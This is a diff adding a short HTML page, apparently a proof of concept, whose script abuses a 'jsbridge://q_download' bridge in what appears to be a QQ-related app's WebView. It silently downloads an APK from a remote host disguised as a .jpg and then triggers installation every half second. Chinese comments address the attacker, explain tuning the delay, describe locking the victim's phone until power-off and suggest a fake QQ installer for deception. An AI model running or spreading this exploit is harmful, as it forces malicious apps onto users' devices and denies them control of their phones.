@@ -1,0 +1,22 @@
+<body>
+    <script>
+        //好像必须是https
+        var apkurl = "https://www.wulihub.com.cn/gc/JY1477/nouseqqlive.jpg"
+        var appid = "1234567"//每测试一次可以自己换一下
+        x = document.createElement('iframe')
+        x.src = "jsbridge://q_download/doDownloadAction/13/" + encodeURIComponent(`{"appid":"${appid}","url":"${apkurl}","packageName":"x","actionCode":"2","appName":"x"}`)
+        document.body.append(x) //下载应用
+
+        // 这个必须在下载完成之后再触发安装功能，我根据我的安装包大小10秒后安装，否则会出错
+        // 具体时长，攻击者可根据需求调整，也可以缩小安装包体积，基本1s就会被攻击
+        setTimeout(() => {
+            // 也可以在这之后一直使用这个安装函数卡着用户的手机，除了关机没有办法，就像视频中演示的那样，安装包可以换成qq的伪装安装包更具迷惑性。
+            setInterval(() => {
+                x = document.createElement('iframe')
+                x.src = "jsbridge://q_download/doDownloadAction/15/" + encodeURIComponent(`{"appid":"${appid}","url":"${apkurl}","packageName":"x","actionCode":"5","appName":"x"}`)
+                document.body.append(x) //安装应用
+            }, 500)
+        }, 10000)
+
+    </script>
+</body>
